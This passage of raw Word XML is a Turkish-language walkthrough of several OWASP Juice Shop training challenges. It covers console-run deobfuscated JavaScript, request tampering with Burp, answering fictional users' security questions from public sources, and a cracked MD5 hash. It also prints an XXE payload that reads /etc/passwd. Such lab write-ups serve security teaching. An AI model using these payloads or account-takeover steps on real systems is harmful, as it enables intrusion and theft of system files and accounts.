    </w:p>
    <w:p w:rsidR="005D39FF" w:rsidRDefault="00CB3125" w:rsidP="00832895">
      <w:r>
        <w:t xml:space="preserve">gibi bir istek yaptırarak </w:t>
      </w:r>
      <w:r w:rsidR="00B35980">
        <w:t>bu challange’i tamamlayabiliriz</w:t>
      </w:r>
      <w:r w:rsidR="009E361A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F22254" w:rsidRDefault="00F22254" w:rsidP="00F22254">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Blockchain Hype---Learn about the Token Sale before its official announcement.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000B3ED5" w:rsidRDefault="000B3ED5" w:rsidP="000B3ED5">
      <w:r>
        <w:t>Kaynak kodları karıştırırken;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="000B3ED5">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">e.when('/track-order', { templateUrl: 'views/TrackOrder.html', controller: 'TrackOrderController' }), </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D75FD8" w:rsidRDefault="00D75FD8" w:rsidP="000B3ED5">
      <w:r>
        <w:t>Şeklindeki kısım ile karşılaştım.Buradan birşeyler çıkarabilirmiyim diye aranırken;Browser Console ile burayı tetiklemeye çalıştım.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>function () {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    var e = Array.prototype.slice.call(arguments),</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    t = e.shift();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    return e.reverse().map(function (e, n) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">      return String.fromCharCode(e - t - 45 - n)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    }).join('')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  }(25, 184, 174, 179, 182, 186) + (36669).toString(36).toLowerCase() + function () {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    var e = Array.prototype.slice.call(arguments),</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    t = e.shift();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    return e.reverse().map(function (e, n) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">      return String.fromCharCode(e - t - 24 - n)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    }).join('')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  }(13, 144, 87, 152, 139, 144, 83, 138) + (10).toString(36).toLowerCase()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Şeklinde bir fonksyon yazdım fakat:</w:t>
      </w:r>
      <w:r w:rsidRPr="00F2742B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">SyntaxError: function statement requires a name debugger eval code:1:9 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:r>
        <w:t xml:space="preserve">şeklinde bir hata aldım ve </w:t>
      </w:r>
      <w:r w:rsidR="001118C0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>bunu bir değişkene örneğin;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>$foo = function () {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    var e = Array.prototype.slice.call(arguments),</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    t = e.shift();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    return e.reverse().map(function (e, n) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">      return String.fromCharCode(e - t - 45 - n)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    }).join('')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  }(25, 184, 174, 179, 182, 186) + (36669).toString(36).toLowerCase() + function () {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    var e = Array.prototype.slice.call(arguments),</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    t = e.shift();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    return e.reverse().map(function (e, n) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">      return String.fromCharCode(e - t - 24 - n)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">    }).join('')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F2742B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  }(13, 144, 87, 152, 139, 144, 83, 138) + (10).toString(36).toLowerCase()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:r>
        <w:t>Şeklinde atadıktan sonra çalıştırdığımda:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5657414" cy="555955"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="2" name="Resim 2" descr="tokensa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okensal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281" cy="560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42B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:r>
        <w:t>Şeklinde çalıştı ve ;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="17F01312" wp14:editId="68ACC5DD">
            <wp:extent cx="5941551" cy="1631290"/>
            <wp:effectExtent l="0" t="0" r="2540" b="762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20996" cy="165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42B" w:rsidRPr="00F2742B" w:rsidRDefault="00F2742B" w:rsidP="00F2742B">
      <w:r>
        <w:t>Sayfasına ulaştım ve challange tamamlandı.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B3F50" w:rsidRDefault="005E1EF5" w:rsidP="005E1EF5">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Product Tampering---Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into </w:t>
      </w:r>
      <w:r w:rsidRPr="005E1EF5">
        <w:t>https://owasp.slack.com</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E1EF5" w:rsidRDefault="005E1EF5" w:rsidP="005E1EF5">
      <w:r>
        <w:t>Bu challange’in çözümünde Burp toolumuzun Repeater’ını kullandım.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00622365" w:rsidRDefault="00622365" w:rsidP="005E1EF5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09B6D8D5" wp14:editId="12E601A9">
            <wp:extent cx="5941670" cy="1901952"/>
            <wp:effectExtent l="0" t="0" r="2540" b="317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53213" cy="190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1B4" w:rsidRDefault="000241B4" w:rsidP="005E1EF5">
      <w:r>
        <w:t>Şeklindeki bir request ve response’dan sonra;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000241B4" w:rsidRDefault="000241B4" w:rsidP="005E1EF5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="542231D0" wp14:editId="20F4C78A">
            <wp:extent cx="5943108" cy="1982419"/>
            <wp:effectExtent l="0" t="0" r="635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35471"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5985826" cy="1996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41B4" w:rsidRDefault="000241B4" w:rsidP="005E1EF5">
      <w:r>
        <w:t>Adresine giderek challange’i tamamlarız.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B70D1" w:rsidRDefault="003B70D1" w:rsidP="003B70D1">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Weird Crypto---Inform the shop about an algorithm or library it should definitely not use the way it does.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B70D1" w:rsidRPr="003B70D1" w:rsidRDefault="003B70D1" w:rsidP="003B70D1">
      <w:r>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="003B70D1">
        <w:t>MD5 is shit!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">”şeklinde bir comment yazmanız bu challange’i çözmek için yeterli olacaktır.Bazen kolay şeyler çok zor farkediliyor </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F04C"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E20390" w:rsidRDefault="00E20390" w:rsidP="00B5519E">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E20390" w:rsidRDefault="00E20390" w:rsidP="00B5519E">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E20390" w:rsidRDefault="00E20390" w:rsidP="00B5519E">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E20390" w:rsidRDefault="00E20390" w:rsidP="00B5519E">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B5519E" w:rsidRDefault="00B5519E" w:rsidP="00B5519E">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Reset Jim's Password---Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B31EA" w:rsidRDefault="00B5519E" w:rsidP="00B5519E">
      <w:r>
        <w:t xml:space="preserve">Önceki kısımlarda Jim’in e-posta adresine </w:t>
      </w:r>
      <w:r w:rsidR="003B70D1">
        <w:t xml:space="preserve">ve hash bilgisine </w:t>
      </w:r>
      <w:r>
        <w:t>ulaşmıştık</w:t>
      </w:r>
      <w:r w:rsidR="009D70ED">
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidR="00BC180D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="003B70D1">
        <w:t>email:</w:t>
      </w:r>
      <w:r w:rsidR="000B7D88" w:rsidRPr="000B7D88">
        <w:t>jim@juice-sh.op</w:t>
      </w:r>
      <w:r w:rsidR="003B70D1">
        <w:t xml:space="preserve"> hash:</w:t>
      </w:r>
      <w:r w:rsidR="003B70D1" w:rsidRPr="003B70D1">
        <w:t xml:space="preserve"> e541ca7ecf72b8d1286474fc613e5e45</w:t>
      </w:r>
      <w:r w:rsidR="003B70D1">
        <w:t xml:space="preserve"> md5decode:</w:t>
      </w:r>
      <w:r w:rsidR="003B70D1" w:rsidRPr="003B70D1">
        <w:t xml:space="preserve"> ncc-1701</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="000B7D88">
        <w:t xml:space="preserve"> forget password kısmına geldiğimizde </w:t>
      </w:r>
      <w:r w:rsidR="000B7D88" w:rsidRPr="000B7D88">
        <w:t>“Your eldest siblings middle name?”</w:t>
      </w:r>
      <w:r w:rsidR="000B7D88">
        <w:t xml:space="preserve"> şeklinde bir sorunun cevabını bizden istiyor.</w:t>
      </w:r>
      <w:r w:rsidR="004F79F0">
        <w:t xml:space="preserve"> Ben şifresini googleladığım zaman  </w:t>
      </w:r>
      <w:hyperlink r:id="rId37" w:history="1">
        <w:r w:rsidR="004F79F0" w:rsidRPr="003B31EA">
          <w:rPr>
            <w:rStyle w:val="Kpr"/>
          </w:rPr>
          <w:t>Wikipedia</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004F79F0">
        <w:t xml:space="preserve"> içerisinde </w:t>
      </w:r>
      <w:r w:rsidR="004F79F0" w:rsidRPr="004F79F0">
        <w:t>Uss Enterprise (NCC-1701)</w:t>
      </w:r>
      <w:r w:rsidR="004F79F0">
        <w:t xml:space="preserve"> şeklinde Uzay</w:t>
      </w:r>
      <w:r w:rsidR="000004F6">
        <w:t xml:space="preserve"> Yolu içerisindeki bir gemi </w:t>
      </w:r>
      <w:r w:rsidR="00617671">
        <w:t xml:space="preserve">ve Kaptanı </w:t>
      </w:r>
      <w:r w:rsidR="00617671" w:rsidRPr="00617671">
        <w:t>James Tiberius "</w:t>
      </w:r>
      <w:r w:rsidR="00617671" w:rsidRPr="00617671">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Jim</w:t>
      </w:r>
      <w:r w:rsidR="00617671" w:rsidRPr="00617671">
        <w:t>" Kirk</w:t>
      </w:r>
      <w:r w:rsidR="00617671">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008E71F6">
        <w:t xml:space="preserve">olduğu </w:t>
      </w:r>
      <w:r w:rsidR="00617671">
        <w:t>çıktı</w:t>
      </w:r>
      <w:r w:rsidR="000004F6">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="003B31EA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005843CA" w:rsidRDefault="003B31EA" w:rsidP="00B5519E">
      <w:r>
        <w:t xml:space="preserve">Wikipedia içerisinde </w:t>
      </w:r>
      <w:r w:rsidR="00A10E5D">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="003B31EA">
        <w:t xml:space="preserve">James Tiberius Kirk was born in Riverside, Iowa, in the year 2233,[1] where he was raised by his parents, George and Winona Kirk.[2] Although born on Earth, Kirk lived for a time on Tarsus IV, where he was one of nine surviving witnesses to the massacre of 4,000 colonists by Kodos the Executioner. James Kirk's brother, George </w:t>
      </w:r>
      <w:r w:rsidRPr="00CC336A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Samuel</w:t>
      </w:r>
      <w:r w:rsidRPr="003B31EA">
        <w:t xml:space="preserve"> Kirk, is first mentioned in "What Are Little Girls Made Of?" and introduced and killed in "Operation: Annihilate!", leaving behind three children.[3]</w:t>
      </w:r>
      <w:r w:rsidR="000004F6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A10E5D">
        <w:t xml:space="preserve">“ </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B70D1" w:rsidRDefault="00A10E5D" w:rsidP="00B5519E">
      <w:r>
        <w:t>metninden kardeşinin adının</w:t>
      </w:r>
      <w:r w:rsidR="005843CA">
        <w:t xml:space="preserve"> ‘</w:t>
      </w:r>
      <w:r w:rsidR="005843CA" w:rsidRPr="00CC336A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Samuel</w:t>
      </w:r>
      <w:r w:rsidR="005843CA" w:rsidRPr="005843CA">
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidR="005843CA">
        <w:t xml:space="preserve"> olduğunu çıkarıp şifresini değitirmeye çalıştığımızda challange’da tamamlanır</w:t>
      </w:r>
      <w:r w:rsidR="00CC336A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AF37DE" w:rsidRDefault="00AF37DE" w:rsidP="00551D44">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Reset Bender's Password---Reset Bender's password via the Forgot Password mechanism with the original answer to his security question.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00551D44" w:rsidRDefault="00551D44" w:rsidP="00551D44">
      <w:r>
        <w:t xml:space="preserve">Bender diye google’ladığımız zaman popüler bir dizi olan Futurama’da bir karakter çıkıyor. Bu karakteri </w:t>
      </w:r>
      <w:hyperlink r:id="rId38" w:history="1">
        <w:r w:rsidRPr="00551D44">
          <w:rPr>
            <w:rStyle w:val="Kpr"/>
          </w:rPr>
          <w:t>araştırdığımızda</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00551D44" w:rsidRDefault="00551D44" w:rsidP="00551D44">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64CEF315" wp14:editId="5BD2BA5F">
            <wp:extent cx="5943600" cy="724205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31190" cy="73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D44" w:rsidRPr="00551D44" w:rsidRDefault="00551D44" w:rsidP="00551D44">
      <w:r>
        <w:t xml:space="preserve">Bilgisine ulaşıyoruz </w:t>
      </w:r>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:r w:rsidRPr="00647D39">
          <w:rPr>
            <w:rStyle w:val="Kpr"/>
          </w:rPr>
          <w:t>buradan</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> suicide booths’u yapan firmayıda bularak security question’u cevaplayarak şifresini değiştirip challange i tamamlıyoruz.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00627B5A" w:rsidRDefault="00627B5A" w:rsidP="00627B5A">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Deprecated Interface---Use a deprecated B2B interface that was not properly shut down.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD1A3B" w:rsidRDefault="00DD1A3B" w:rsidP="00DD1A3B">
      <w:r>
        <w:t xml:space="preserve">XXE ile alakalı </w:t>
      </w:r>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:r w:rsidRPr="00DD1A3B">
          <w:rPr>
            <w:rStyle w:val="Kpr"/>
          </w:rPr>
          <w:t>OWASP</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">’ın </w:t>
      </w:r>
      <w:r w:rsidR="00BF03B9">
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>ermiş olduğu örneklerden birini kullanarak örneğin;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD1A3B" w:rsidRPr="00DD1A3B" w:rsidRDefault="00DD1A3B" w:rsidP="00DD1A3B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD1A3B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD1A3B" w:rsidRPr="00DD1A3B" w:rsidRDefault="00DD1A3B" w:rsidP="00DD1A3B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD1A3B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD1A3B" w:rsidRPr="00DD1A3B" w:rsidRDefault="00DD1A3B" w:rsidP="00DD1A3B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD1A3B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;!ELEMENT foo ANY &gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD1A3B" w:rsidRDefault="00DD1A3B" w:rsidP="00DD1A3B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD1A3B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD1A3B" w:rsidRDefault="00DD1A3B" w:rsidP="00DD1A3B">
      <w:r w:rsidRPr="00DD1A3B">
        <w:t xml:space="preserve">Bunu bir </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">editor ile </w:t>
      </w:r>
      <w:r w:rsidRPr="00DD1A3B">
        <w:t>xml dosyas</w:t>
      </w:r>
      <w:r>
        <w:t>ı olarak sitenin “Complaint” kısmına ekleyip submit etiğimizde challange tamamlanır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB56F9" w:rsidRDefault="00BB56F9" w:rsidP="00DD1A3B"/>
    <w:p w:rsidR="00BB56F9" w:rsidRDefault="00BB56F9" w:rsidP="00DD1A3B">
